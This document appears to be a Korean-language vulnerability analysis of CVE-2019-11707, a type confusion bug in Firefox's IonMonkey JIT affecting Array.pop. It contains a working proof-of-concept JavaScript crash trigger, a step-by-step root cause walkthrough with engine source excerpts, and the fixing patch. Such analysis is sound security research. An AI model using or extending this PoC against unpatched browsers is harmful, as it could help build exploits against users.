# CVE-2019-11707

A type confusion vulnerability can occur when manipulating JavaScript objects due to issues in Array.pop. This can allow for an exploitable crash. We are aware of targeted attacks in the wild abusing this flaw.


## Proof-of-Concept

```JS

// Run with --no-threads for increased reliability
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
function v7(v8,v9) {
    if (v4.length == 0) {
        v4[3] = {a: 5};
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when  p[0] is fetched here.
    const v11 = v4.pop();

    // Then if will crash here when dereferencing a controlled double value as pointer.
    v11.a;

    // Force JIT compilation.
    for (let v15 = 0; v15 < 10000; v15++) {}
}

var p = {};
p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];
p[0] = -1.8629373288622089e-06;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    v7();
}

```



## Root Cause Analysis

취약점 설명에 앞서, inline caching이란, 속도를 향상시키기 위해 기존에 찾았던 값을 look-up 테이블에 저장해놓고, 다시 접근할때 빠르게 해당 값을 반환하도록 하는 기법을 말한다. 예를 들어, `Array.pop()`이 호출된 경우, 다음과 같은 과정을 거친다.

- `Array` object의 prototype을 얻는다
- prototype 안에서 `pop` 함수 property를 탐색
- `pop` 함수의 주소를 얻는다.
- `pop` 함수를 inlining하기 위해 해당 주소를 look-up 테이블에 저장한다. 이후 `Array.pop()`이 호출될 때 주소값을 찾는 과정을 절약할 수 있다.



본 취약점은 Firefox의 JIT 엔진, IonMonkey의 `Array.prototype.pop`, `Array.prototype.push`, `Array.prototype.slice`에 대한 inline caching 과정에서 현재 prototype에 indexed element가 존재 여부를 검사하지 않기 때문에 발생한다.

PoC 코드를 살펴보면, 취약점은 다음 단계를 거쳐 실행된다.



1. `v4` 배열이 `JSObjects` 형태의 구성요소를 사용하여 초기화된다. 이와 관련하여 SpiderMonkey의 타입 추론 시스템은 `v4`가 `JSObjects`만을 그 element로 가진다고 생각한다.

```JS
    const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
```


2. `p` 배열 또한 `JSObjects` 형태의 구성요소를 사용하여 초기화된다.

```JS
    var p = {};
    p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];
```


3. `p[0]`을 float 값으로 초기화한다. 여기부터 `p`의 Array type이 변화된다 (index element의 추가).

```JS
    p[0] = -1.8629373288622089e-06;
```

4. `v4`의 prototype을 `p`로 변경한다. 따라서 `v4`의 prototype은 indexed element를 새로 가지게 되었다(type이 변경되었다). 하지만, Spidermonkey는 이를 따로 추적하지 않는다.

```JS
    v4.__proto__ = p;
```

5. `v7()` 함수를 실행함으로서 `v4`의 모든 element가 pop된다. 이 과정에서 `v4[3] = {a: 5};` 구문은 `v4`의 inferred-type을 변경하지 않으면서 `v4` 배열의 길이를 늘리는 역할을 수행한다.

```JS
    for (let v31 = 0; v31 < 1000; v31++) {
        v7();
    }
```

```JS
    if (v4.length == 0) {
        v4[3] = {a: 5};
    }
```

6. `v7`이 반복실행되면서 IonMonkey에 의해 해당 함수가 compile을 시작한다. `v4.pop()` 구문은 IonMonkey의 `IonBuilder::inlineArrayPopShift` 함수를 통해 `MArrayPopShift` instruction으로 컴파일된다.

7. IonMonkey는 `v4`에 `JSObject`만 존재한다고 인식하고 있기 때문에, `v4`에 대한 inferred type check를 생략한다.


```C++
  bool needsHoleCheck =
      thisTypes->hasObjectFlags(constraints(), OBJECT_FLAG_NON_PACKED);
  bool maybeUndefined = returnTypes->hasType(TypeSet::UndefinedType());

  BarrierKind barrier = PropertyReadNeedsTypeBarrier(
      analysisContext, alloc(), constraints(), obj, nullptr, returnTypes); // emits no type-check
  if (barrier != BarrierKind::NoBarrier) {
    returnType = MIRType::Value;
  }
```

8. 이후 IonMonkey는 `v4.pop`에 대해 `ArrayPopDense` 함수를 (type check 없이) 호출하는 machine code를 생성한다.

```C++
bool ArrayPopDense(JSContext* cx, HandleObject obj, MutableHandleValue rval) {
  MOZ_ASSERT(obj->is<ArrayObject>());

  AutoDetectInvalidation adi(cx, rval);

  JS::AutoValueArray<2> argv(cx);
  argv[0].setUndefined();
  argv[1].setObject(*obj);
  if (!js::array_pop(cx, 0, argv.begin())) {
    return false;
  }

  // If the result is |undefined|, the array was probably empty and we
  // have to monitor the return value.
  rval.set(argv[0]);
  if (rval.isUndefined()) {
    TypeScript::Monitor(cx, rval);
  }
  return true;
}
```

해당 함수는 `js::array_pop`를 호출하여 `p[0]` 값을 얻게 된다. 즉, double 타입의 값이 얻어진다.
즉, 이는 IonMonkey가 JIT을 수행할 때, `Array.prototype.pop`이 prototype에서도 element를 얻어올 수 있다는 것을 고려하지 않아 발생한 문제이다.


9. 하지만, JITed code는 해당 값을 `JSObject`라고 인식하고 있으므로 type confusion이 발생한다.








## Patch

다음과 같이 Array prototype에 대한 type check만을 수행하는 것이 아니라, 주어진 array 자체의 property를 모두 검사하는 것으로 변화하였다.

```diff
--- a/js/src/jit/MCallOptimize.cpp
+++ b/js/src/jit/MCallOptimize.cpp
@@ -1041,26 +1042,20 @@ IonBuilder::InliningResult IonBuilder::i
   TemporaryTypeSet* thisTypes = obj->resultTypeSet();
   if (!thisTypes) {
     return InliningStatus_NotInlined;
   }
   const Class* clasp = thisTypes->getKnownClass(constraints());
   if (clasp != &ArrayObject::class_) {
     return InliningStatus_NotInlined;
   }
-  if (thisTypes->hasObjectFlags(
-          constraints(),
-          OBJECT_FLAG_SPARSE_INDEXES | OBJECT_FLAG_LENGTH_OVERFLOW)) {
-    trackOptimizationOutcome(TrackedOutcome::ArrayBadFlags);
-    return InliningStatus_NotInlined;
-  }
 
   bool hasIndexedProperty;
   MOZ_TRY_VAR(hasIndexedProperty,
-              ArrayPrototypeHasIndexedProperty(this, script()));
+              ElementAccessHasExtraIndexedProperty(this, obj));
   if (hasIndexedProperty) {
     trackOptimizationOutcome(TrackedOutcome::ProtoIndexedProps);
     return InliningStatus_NotInlined;
   }
 
   TemporaryTypeSet::DoubleConversion conversion =
       thisTypes->convertDoubleElements(constraints());
   if (conversion == TemporaryTypeSet::AmbiguousDoubleConversion) {
```
